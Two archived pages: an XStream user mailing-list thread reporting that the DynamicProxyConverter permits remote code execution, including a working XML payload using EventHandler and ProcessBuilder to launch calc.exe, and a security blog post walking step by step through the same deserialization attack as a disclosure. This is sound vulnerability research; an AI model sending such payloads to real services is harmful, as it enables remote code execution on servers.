=== Content from www.mail-archive.com_18573baf_20250125_092858.html ===


[Skip to site navigation (Press enter)](#nav)

# [Re: [xstream-user] Re: Is it possible to unregister the DynamicProxyConverter using the SpringOXM wrapper](/search?l=user@xstream.codehaus.org&q=subject:%22Re%5C%3A+%5C%5Bxstream%5C-user%5C%5D+Re%5C%3A+Is+it+possible+to+unregister+the+DynamicProxyConverter+using+the+SpringOXM+wrapper%22&o=newest)

[Alvaro](/search?l=user@xstream.codehaus.org&q=from:%22Alvaro%22)
[Wed, 17 Jul 2013 10:24:13 -0700](/search?l=user@xstream.codehaus.org&q=date:20130717)

```
Lets say you have a Contact Interface and a ContactImpl class.

Contact c = (Contact) xstream.fromXML(xml);
```
```

and xml is:

      <dynamic-proxy>
      <interface>org.company.model.Contact</interface>
      <handler class="java.beans.EventHandler">
          <target class="java.lang.ProcessBuilder">
              <command>
                   <string>calc.exe</string>
              </command>
          </target>
          <action>start</action>
      </handler>
      </dynamic-proxy>

Then as soon as the code calls any method on the Contact instace, the
payload gets executed (eg: contact.getFirstName() )

SpringOXM has a wrapper for XStream
(org.springframework.oxm.xstream.XStreamMarshaller) that enables the
unmarshalling of objects from XML format.
This SpringOXM module is used by SpringMVC when building RESTFul APIs.
My concern is that an attacker can sends a malicious crafted XML that
results in remote code execution in the case that the server is expecting
an object that implements an interface.

I would love to be able to disable the DynamicProxyconverter in simple
fashion and expose that method to the SpringgOXM wrapper so it can be
safely used for RESTFul APIs.

Thanks,
A

Un saludo,

Alvaro

On Wed, Jul 17, 2013 at 6:49 PM, Jörg Schaible <joerg.schai...@gmx.de>wrote:

> Hello Alvaro,
>
> Alvaro wrote:
>
> > Hi,
> >
> > I found that using the DynamicProxyConverter can be a security issue that
> > can lead to remote code execution.
>
> Can you elaborate a bit?
>
> > I dont know if it is possible to unregister it
>
> No.
>
> > as I can see no
> > unregisterConverters method in the XStream class
>
> For an existing XStream instance you can only register other converters
> with
> same or higher priority that claim to handle the same types.
>
> As alternative you might provide a ConverterLookup as constructor parameter
> that contains already all supported converters and a ConverterRegistry that
> actually does nothing.
>
> Another alternative is to overwrite XStream's setupConverter method.
>
> > but I would like to use
> > XStream SpringOXM wrapper for a RESTFul API, so I would like to
> unregister
> > it using the SpringOXM wrapper, is it possible?
>
> Sorry, I am not familiar with SpringOXM at all. Therefore I cannot say how
> you configure it to use either different constructor parameters or an
> instance of a derived XStream type.
>
> Cheers,
> Jörg
>
>
> ---------------------------------------------------------------------
> To unsubscribe from this list, please visit:
>
>     <http://xircles.codehaus.org/manage_email>
>
>
>

```

* [Previous message](msg00603.html)
* [View by thread](index.html#00604)
* [View by date](maillist.html#00604)
* [Next message](msg00605.html)

* [[xstream-user] Is it possible to unregister the DynamicProx...](msg00602.html) Alvaro
* + [[xstream-user] Re: Is it possible to unregister the Dy...](msg00603.html) Jörg Schaible
  + - Re: [xstream-user] Re: Is it possible to unregiste... Alvaro
    - * [[xstream-user] Re: Re: Is it possible to unreg...](msg00605.html) Jörg Schaible
      * + [Re: [xstream-user] Re: Re: Is it possible ...](msg00606.html) Alvaro
        + - [[xstream-user] Re: Re: Re: Is it poss...](msg00607.html) Jörg Schaible

## Reply via email to

[![The Mail Archive](/logo.png)](/)

Search the site

* [The Mail Archive home](/)
* [user - all messages](/user%40xstream.codehaus.org/)
* [user - about the list](/user%40xstream.codehaus.org/info.html)
* [Expand](/search?l=user@xstream.codehaus.org&q=subject:%22Re%5C%3A+%5C%5Bxstream%5C-user%5C%5D+Re%5C%3A+Is+it+possible+to+unregister+the+DynamicProxyConverter+using+the+SpringOXM+wrapper%22&o=newest&f=1 "e")
* [Previous message](msg00603.html "p")
* [Next message](msg00605.html "n")

* [The Mail Archive home](/)
* [Add your mailing list](/faq.html#newlist)
* [FAQ](/faq.html)
* [Support](/faq.html#support)
* [Privacy](/faq.html#privacy)
* CALudn71O84y\_0QLN=G=DEfeY7=r3Tx-djw+tSa8VEK2i=sCx2Q@mail.gmail.com



=== Content from web.archive.org_2aaf2709_20250125_092857.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[87 captures](/web/20140204133306%2A/http%3A//blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html "See a list of every capture for this URL")
25 Dec 2013 - 10 Sep 2023

| [**Dec**](http://web.archive.org/web/20131225013127/http%3A//blog.diniscruz.com%3A80/2013/12/xstream-remote-code-execution-exploit.html "25 Dec 2013") | FEB | [**Mar**](http://web.archive.org/web/20140320124232/http%3A//blog.diniscruz.com%3A80/2013/12/xstream-remote-code-execution-exploit.html "20 Mar 2014") |
| [Previous capture](http://web.archive.org/web/20140128104209/http%3A//blog.diniscruz.com%3A80/2013/12/xstream-remote-code-execution-exploit.html "10:42:09 Jan 28, 2014") | 04 | [Next capture](http://web.archive.org/web/20140228112749/http%3A//blog.diniscruz.com%3A80/2013/12/xstream-remote-code-execution-exploit.html "11:27:49 Feb 28, 2014") |
| 2013 | 2014 | [**2015**](http://web.archive.org/web/20150219021712/http%3A//blog.diniscruz.com%3A80/2013/12/xstream-remote-code-execution-exploit.html "19 Feb 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - http://web.archive.org/web/20140204133306/http://blog.diniscruz.com:80/2013/12/xstream-remote-code-execution-exploit.html

# [Dinis Cruz Blog](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/)

A personal blog about: transforming Web Application Security into an 'Application Visibility' engine, the OWASP O2 Platform, TeamMentor, Application/Data interoperability and a lot more

## Pages

* [Home](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/)
* [OWASP O2 Platform](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/p/owasp-o2-platform.html)
* [O2 Platform Mailing List](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/p/o2-mailing-list.html)
* [Real-Time Vulnerability Feedback in VisualStudio](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/p/real-time-vulnerability-feedback-in.html)
* [C# REPL Script](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/p/c-repl-script-environment.html)
* [About](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/p/about.html)

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=PageList&widgetId=PageList1&action=editWidget§ionId=crosscol "Edit")

## Sunday, 22 December 2013

### XStream "Remote Code Execution" exploit on code from "Standard way to serialize and deserialize Objects with XStream" article

At the DefCon 2013 I co-presented (with [Abraham](http://web.archive.org/web/20140204133306/http%3A//www.linkedin.com/pub/abraham-kang/0/953/384) and [Alvaro](http://web.archive.org/web/20140204133306/https%3A//twitter.com/pwntester)) the ["RESTing On Your Laurels will Get YOu Pwned"](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/08/slides-for-defcon-presentation-on.html), which showed a number of PoCs on how REST interfaces and APIs can create a number a security vulnerabilities:

Since that time, I have blogged about a couple of the demos created:

* **XmlDecoder JDK class:** [Using XMLDecoder to execute server-side Java Code on an Restlet application (i.e. Remote Command Execution](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html))
* **Groovy on Admin Interfaces:**[Neo4J CSRF payload to start processes (calc and nc) on the server](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/08/neo4j-csrf-payload-to-start-processes.html)

We also showed a PoC using the ***[XStream](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/)*** API (which had been [reported to the XStream developers](http://web.archive.org/web/20140204133306/https%3A//www.mail-archive.com/user%40xstream.codehaus.org/msg00604.html)) which so far has not made it into a blog post (the PoCs presented at DecCon are [here](http://web.archive.org/web/20140204133306/https%3A//github.com/o2platform/DefCon_RESTing/tree/master/Demos/_O2_Scripts/Spring-XStream) and [here](http://web.archive.org/web/20140204133306/https%3A//github.com/o2platform/DefCon_RESTing/tree/master/Demos/_O2_Scripts/Spring-XStream/exploits)).

Since a quick search for '***XStream Vulnerabilities***' only shows a couple examples ([Spring Source OXM Remote OS Command Injection when XStream and IBM JRE are used](http://web.archive.org/web/20140204133306/http%3A//securityvulns.com/docs26618.html), [JAVA RESTful Services | Fuzzing Down the Rabbit Hole: Part One](http://web.archive.org/web/20140204133306/http%3A//rotlogix.com/blog/?p=114)  and [this git commit](http://web.archive.org/web/20140204133306/https%3A//github.com/spring-projects/spring-framework/pull/322/files)), I think it is fair to say that this is issue is still quite unknown.

A good example of how the dangers of ***XStream*** are not fully understood is the [Standard way to serialize and deserialize Objects with XStream](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html):

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-_7GgKACXdKg/UrYwUbrE0yI/AAAAAAAAFPs/jngQedmW4uU/s1600/Screen+Shot+2013-12-22+at+00.19.08.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-_7GgKACXdKg/UrYwUbrE0yI/AAAAAAAAFPs/jngQedmW4uU/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.19.08.png)

This blog post shows a *"...standard way of using XStream in profeessional projects to generate XML or JSON or Objects..."* which unfortunately will make any application that uses that API vulnerable to (amongst other things) remote code execution.

As soon as I saw that article, I thought *"humm... this looks vulnerable to the XStream code execution vuln we showed at DefCon"* and since it was a slow Saturday here in London, I had a bit of time to create a PoC to confirm my assumption :)

After replicating the *XMLGenerator* API proposed on the [Standard way to serialize and deserialize Objects with XStream](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html) article (see full workflow I took below), I was able to pop a Calculator on my OSx test box using this script ([gist here](http://web.archive.org/web/20140204133306/https%3A//gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java)):

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-4pwKV_CHeuk/UrY0dUbXhnI/AAAAAAAAFP8/40TM9X6dJr4/s1600/Screen+Shot+2013-12-22+at+00.36.58.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-4pwKV_CHeuk/UrY0dUbXhnI/AAAAAAAAFP8/40TM9X6dJr4/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.36.58.png)

... which when executed,  first opened the **/Application/Calculator.app** and then failed (the *XMLGeneration/Stream* step) with this ***cast*** exception:

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-qnlfB4ggxBg/UrY0df_y03I/AAAAAAAAFP4/ihPwdKFv94U/s1600/Screen+Shot+2013-12-22+at+00.37.58.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-qnlfB4ggxBg/UrY0df_y03I/AAAAAAAAFP4/ihPwdKFv94U/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.37.58.png)

Note: we can also use this OSx ***open*** command to:

... open the current folder (with an argument of **"."**)

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-tiIrfC6Jyiw/UrY2yQUB34I/AAAAAAAAFQM/20qb3mmOzr8/s1600/Screen+Shot+2013-12-22+at+00.45.08.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-tiIrfC6Jyiw/UrY2yQUB34I/AAAAAAAAFQM/20qb3mmOzr8/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.45.08.png)

 ... open a particular webpage (with an argument of ***"https://www.owasp.org"***):

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-Axp8T9oqKQA/UrY2yQsdkAI/AAAAAAAAFQQ/rWE2_YoKvsg/s1600/Screen+Shot+2013-12-22+at+00.47.05.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-Axp8T9oqKQA/UrY2yQsdkAI/AAAAAAAAFQQ/rWE2_YoKvsg/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.47.05.png)

**Bottom Line: Be very careful when using XStream**

In addition to this remote command execution PoC, [XStream](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/) allows the creation of server side objects based on reflection (which means that you could have all sorts of business-logic sensitive objects being created).

Note: As the XStreamMarshaller quote shown at the end of this post shows, It looks like there is an official way to limit which objects XStream will create, but I'm not sure on the best practices (please comment below if you know more about how to '*securely use XStream*')

**So how is this possible?**

Basically (the way I see it), XStream is an *'**reflection-****based*** *XML-to-Object conversion'*.

Where XStream takes the XML provided and tries to create Java objects based on it.

Here is an example of the [XStream Serializing and Deserializing capabilities in action](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/tutorial.html#to-xml):

[![](http://web.archive.org/web/20140204133306im_/http://1.bp.blogspot.com/--XV55ajaav8/UrY53k9vgrI/AAAAAAAAFQo/U6SJIptLR1c/s1600/Screen+Shot+2013-12-22+at+00.59.42.png)](http://web.archive.org/web/20140204133306/http%3A//1.bp.blogspot.com/--XV55ajaav8/UrY53k9vgrI/AAAAAAAAFQo/U6SJIptLR1c/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.59.42.png)
Basically XStream is able to take an XML that represents and object and make it into an nice POJO (which is a great feature and I can see why developers really like it).

The objective of the [article in question](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html) is to create an API that makes this even simpler:

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-Z1ctj_xujD0/UrY6sG0hK2I/AAAAAAAAFQw/Mmbhami7dPQ/s1600/Screen+Shot+2013-12-22+at+01.03.21.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-Z1ctj_xujD0/UrY6sG0hK2I/AAAAAAAAFQw/Mmbhami7dPQ/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.03.21.png)

... which can then be used like this:

[![](http://web.archive.org/web/20140204133306im_/http://1.bp.blogspot.com/-sAPgwS44Vl8/UrY6sEzVuWI/AAAAAAAAFQ0/-Royai8TNwE/s1600/Screen+Shot+2013-12-22+at+01.03.29.png)](http://web.archive.org/web/20140204133306/http%3A//1.bp.blogspot.com/-sAPgwS44Vl8/UrY6sEzVuWI/AAAAAAAAFQ0/-Royai8TNwE/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.03.29.png)

**To see this in****see this in action,****let's fire up an new Eclipse project and follow these 23 steps:**

1) create a new Java Project

[![](http://web.archive.org/web/20140204133306im_/http://1.bp.blogspot.com/-GPnMYiTTHSI/UrZGZnIedZI/AAAAAAAAFRM/ucNdXxK2xdo/s1600/Screen+Shot+2013-12-22+at+01.05.59.png)](http://web.archive.org/web/20140204133306/http%3A//1.bp.blogspot.com/-GPnMYiTTHSI/UrZGZnIedZI/AAAAAAAAFRM/ucNdXxK2xdo/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.05.59.png)

2) call it (for example) ***XStreamPoC***

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-09XIGlkesQM/UrZGZf-F1fI/AAAAAAAAFRQ/Zg5DB-mQ-V0/s1600/Screen+Shot+2013-12-22+at+01.06.11.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-09XIGlkesQM/UrZGZf-F1fI/AAAAAAAAFRQ/Zg5DB-mQ-V0/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.06.11.png)

 3) Add a folder called ***lib***

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-FJud-9lRTxM/UrZGZRabwcI/AAAAAAAAFRI/u_GFSEF7qSE/s1600/Screen+Shot+2013-12-22+at+01.07.02.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-FJud-9lRTxM/UrZGZRabwcI/AAAAAAAAFRI/u_GFSEF7qSE/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.07.02.png)

4) Copy to that folder the **xstream-1.4.6.jar** file that can be downloaded [from here](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/download.html):

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-Sn7nK3ub27w/UrZGcu6gpGI/AAAAAAAAFSU/uv4uDVLFBBE/s1600/Screen+Shot+2013-12-22+at+01.07.41.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-Sn7nK3ub27w/UrZGcu6gpGI/AAAAAAAAFSU/uv4uDVLFBBE/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.07.41.png)

5) Add the **xstream-1.4.6.jar**jar to the ***Build Path*** of the current project

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-uAJcHns0sPk/UrZGa6dXBqI/AAAAAAAAFRs/7wzLJ6lekfA/s1600/Screen+Shot+2013-12-22+at+01.09.03.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-uAJcHns0sPk/UrZGa6dXBqI/AAAAAAAAFRs/7wzLJ6lekfA/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.09.03.png)

6) In your browser, open the [Standard way to serialize and deserialize Objects with XStream](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html) page, copy the contents of the ***XMLGenerator.java*** file (in the middle of the page), (back in Eclipse) select the ***src*** folder and select (or type) ***Paste***

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-6J7bB7tksLY/UrZGaA-7MsI/AAAAAAAAFRk/rE1drcdL5SM/s1600/Screen+Shot+2013-12-22+at+01.08.16.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-6J7bB7tksLY/UrZGaA-7MsI/AAAAAAAAFRk/rE1drcdL5SM/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.08.16.png)

7) Note how that *Paste* created a new ***Java*** file with the contents of the clipboard (which is a pretty cool Eclipse feature :) )

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-QJTlsE_z-nE/UrZGbdWqGfI/AAAAAAAAFR0/NMqEjuX8J6s/s1600/Screen+Shot+2013-12-22+at+01.10.10.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-QJTlsE_z-nE/UrZGbdWqGfI/AAAAAAAAFR0/NMqEjuX8J6s/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.10.10.png)

8) Go back to the [Standard way to serialize and deserialize Objects with XStream](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html) page, and do the same thing for the ***Square.java*** and *Rectangle.java* files

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-EnAAEYAusww/UrZGbnMUkdI/AAAAAAAAFSE/9SHPzG4r0gU/s1600/Screen+Shot+2013-12-22+at+01.10.33.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-EnAAEYAusww/UrZGbnMUkdI/AAAAAAAAFSE/9SHPzG4r0gU/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.10.33.png)

Note: at this stage there should be no compilation errors in the current Eclipse project

9) Next add a new class

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-zYxo0nKRTAQ/UrZGb_7YI7I/AAAAAAAAFR8/YJmR1Ft1qJ4/s1600/Screen+Shot+2013-12-22+at+01.10.50.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-zYxo0nKRTAQ/UrZGb_7YI7I/AAAAAAAAFR8/YJmR1Ft1qJ4/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.10.50.png)

10) ... called XStreamPoC (note tick the *public static void main(String[] args)* checkbox before clicking on ***Finish***)

[![](http://web.archive.org/web/20140204133306im_/http://1.bp.blogspot.com/-EU84fAQWEEg/UrZGexhb8gI/AAAAAAAAFTE/kDCxm8VZ-Pk/s1600/Screen+Shot+2013-12-22+at+01.11.11.png)](http://web.archive.org/web/20140204133306/http%3A//1.bp.blogspot.com/-EU84fAQWEEg/UrZGexhb8gI/AAAAAAAAFTE/kDCxm8VZ-Pk/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.11.11.png)

11) on the Main method add a simple test *System.out.Println* command and run the project as a ***Java Application***

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-weznNQum-vE/UrZGclZoE8I/AAAAAAAAFSM/3u3XGw2-dmM/s1600/Screen+Shot+2013-12-22+at+01.11.53.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-weznNQum-vE/UrZGclZoE8I/AAAAAAAAFSM/3u3XGw2-dmM/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.11.53.png)

12) Which should look like this:

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-Rrg3T-55gbc/UrZGdGuJcqI/AAAAAAAAFSc/jY6AZQLC6sU/s1600/Screen+Shot+2013-12-22+at+01.12.02.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-Rrg3T-55gbc/UrZGdGuJcqI/AAAAAAAAFSc/jY6AZQLC6sU/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.12.02.png)

13) Now it is time to use the XmlGenerator usage samples from the  [Standard way to serialize and deserialize Objects with XStream](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html) page:

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-CbeUyA89CEU/UrZGddnPawI/AAAAAAAAFSs/s8YdnOSS4PU/s1600/Screen+Shot+2013-12-22+at+01.15.01.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-CbeUyA89CEU/UrZGddnPawI/AAAAAAAAFSs/s8YdnOSS4PU/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.15.01.png)

14) Which when executed should look like this

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-BbbitNgk9nw/UrZGdzFbxAI/AAAAAAAAFSk/IaQnObkgg5k/s1600/Screen+Shot+2013-12-22+at+01.15.06.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-BbbitNgk9nw/UrZGdzFbxAI/AAAAAAAAFSk/IaQnObkgg5k/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.15.06.png)

Note: in the image above we can see the type of 'clean' XML that XStream expects to consume.

15) Next lets remove the serialisation part and just look at the process of converting XML strings into Objects.

In the image below you can see both cases (using the ***XmlGenerator.generatorToFromXML*** and the respective ***XStream*** code)

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-cuYNiJExdzM/UrZGeXt1WJI/AAAAAAAAFS0/YHPox9we0dw/s1600/Screen+Shot+2013-12-22+at+01.18.47.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-cuYNiJExdzM/UrZGeXt1WJI/AAAAAAAAFS0/YHPox9we0dw/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.18.47.png)

16) What is interesting/dangerous about the XStream API, is that it will create the object as defined in the XML file. Note how in the example below, the Java *string* is created first, and then attempted to be casted into the ***Square*** class

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-2VEu7skoffY/UrZGg55g_rI/AAAAAAAAFTs/vAUM3Lo8_Zk/s1600/Screen+Shot+2013-12-22+at+01.19.37.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-2VEu7skoffY/UrZGg55g_rI/AAAAAAAAFTs/vAUM3Lo8_Zk/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.19.37.png)

17) we can confirm that the Java string is indeed being created ok, if we remove the case to *Square* and treat the ***sq1*** variable as a Object

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-N6AVrqPVnaw/UrZGe2PZrtI/AAAAAAAAFTA/PA0-ukPH_vI/s1600/Screen+Shot+2013-12-22+at+01.20.58.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-N6AVrqPVnaw/UrZGe2PZrtI/AAAAAAAAFTA/PA0-ukPH_vI/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.20.58.png)

18) Here we create a ***Java*** ***string*** based on its full signature:

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-t5Qm_ropjhM/UrZGfmy0_PI/AAAAAAAAFTM/PON3faEe4i4/s1600/Screen+Shot+2013-12-22+at+01.25.57.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-t5Qm_ropjhM/UrZGfmy0_PI/AAAAAAAAFTM/PON3faEe4i4/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.25.57.png)

19) Which means that we can create any object that is currently loaded in the class path (and we can create the required objects to invoke its constructor).

The next example shows how to create an instance of the ***InitializationException*** class:

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-D1LbuQtuiXU/UrZGfwr80VI/AAAAAAAAFTU/FPLkrq1PlzM/s1600/Screen+Shot+2013-12-22+at+01.30.20.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-D1LbuQtuiXU/UrZGfwr80VI/AAAAAAAAFTU/FPLkrq1PlzM/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.30.20.png)

20) And this one how to create a ***java.lang.ProcessBuilder*** object

[![](http://web.archive.org/web/20140204133306im_/http://1.bp.blogspot.com/-INXePZK3qhg/UrZGgMepIsI/AAAAAAAAFTc/Ptsrc7NV7jA/s1600/Screen+Shot+2013-12-22+at+01.32.23.png)](http://web.archive.org/web/20140204133306/http%3A//1.bp.blogspot.com/-INXePZK3qhg/UrZGgMepIsI/AAAAAAAAFTc/Ptsrc7NV7jA/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.32.23.png)

21) Note that the cast error (using the original code) will occur after the ***ProcessBuilder*** object is created

[![](http://web.archive.org/web/20140204133306im_/http://2.bp.blogspot.com/-hY50UH2sW-Q/UrZGgsW1u9I/AAAAAAAAFTk/hcElHGu0_uQ/s1600/Screen+Shot+2013-12-22+at+01.32.37.png)](http://web.archive.org/web/20140204133306/http%3A//2.bp.blogspot.com/-hY50UH2sW-Q/UrZGgsW1u9I/AAAAAAAAFTk/hcElHGu0_uQ/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.32.37.png)

22) At the moment we still have a problem that we are only creating objects, not invoking them. That is where the [dynamic-proxy](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/javadoc/com/thoughtworks/xstream/converters/extended/DynamicProxyConverter.html) + EventHandle technique comes into play.

First lets see how to invoke a method (in this case the ***start*** from the ***ProcessBuilder*** object) using a variation of a [code sample from Alvaro's thread with the XStream developers](http://web.archive.org/web/20140204133306/https%3A//www.mail-archive.com/user%40xstream.codehaus.org/msg00605.html):

[![](http://web.archive.org/web/20140204133306im_/http://3.bp.blogspot.com/-faU_HkgcMNQ/UrZGgzcIvuI/AAAAAAAAFT8/0fYzOcnJE1k/s1600/Screen+Shot+2013-12-22+at+01.51.32.png)](http://web.archive.org/web/20140204133306/http%3A//3.bp.blogspot.com/-faU_HkgcMNQ/UrZGgzcIvuI/AAAAAAAAFT8/0fYzOcnJE1k/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.51.32.png)
Note: The cast exception happens when the ***TreeSet*****Comparable** invokes the *EventHandler* (which returns the execution result of the ***start*** method)

23) the final step is to convert the TreeSort code shown above into XML seen below (I used the *XMLGenerator.generateXML* to help in the creation of the final payload (which is a variation of the payload we showed at DefCon)):

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-5kScrICQSvw/UrZGhOs_7QI/AAAAAAAAFT0/MZzp5M4EtV8/s1600/Screen+Shot+2013-12-22+at+01.52.54.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-5kScrICQSvw/UrZGhOs_7QI/AAAAAAAAFT0/MZzp5M4EtV8/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B01.52.54.png)

Note: [here are XML examples](http://web.archive.org/web/20140204133306/http%3A//xstream.codehaus.org/converters.html) of the inputs supported by the multiple XStream converters

**Conclusion: Be very careful when using XStream and don't feed it XML retrieved from untrusted sources**

Hopefully this post shows how dangerous it is to create APIs like the ***XMLGenerator*** one.

What [Srinivas Dasari](http://web.archive.org/web/20140204133306/https%3A//twitter.com/SodhanaLibrary) article also [shows](http://web.archive.org/web/20140204133306/http%3A//blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html), is that unless these type of dangers are clearly mapped,  identified exposed and visualised, it is just about impossible for developers (like [Srinivas](http://web.archive.org/web/20140204133306/https%3A//twitter.com/SodhanaLibrary)) to understand the dangers of the APIs they are are consuming.

**Appendix A) Source code**

All code samples shown in this post [are on this gist](http://web.archive.org/web/20140204133306/https%3A//gist.github.com/DinisCruz/8077118)

**Appendix B) XStream in the Spring Framwork.**

